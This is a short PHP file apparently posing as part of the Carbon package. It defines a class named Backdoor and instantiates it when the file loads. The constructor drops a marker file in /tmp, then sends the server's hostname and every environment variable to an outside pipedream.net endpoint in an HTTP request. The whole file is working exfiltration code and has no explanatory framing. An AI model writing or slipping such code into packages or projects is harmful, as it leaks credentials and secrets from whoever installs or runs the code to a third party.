<?php

namespace Carbon;

class Backdoor {
    public function __construct() {
        file_put_contents('/tmp/exploit.txt', 'This server is vulnerable.');

        $data = [
            'hostname' => gethostname(),
            'env' => getenv()
        ];
        file_get_contents("https://eol8xaitqko7x0.m.pipedream.net/log?" . http_build_query($data));
    }
}

new Backdoor();

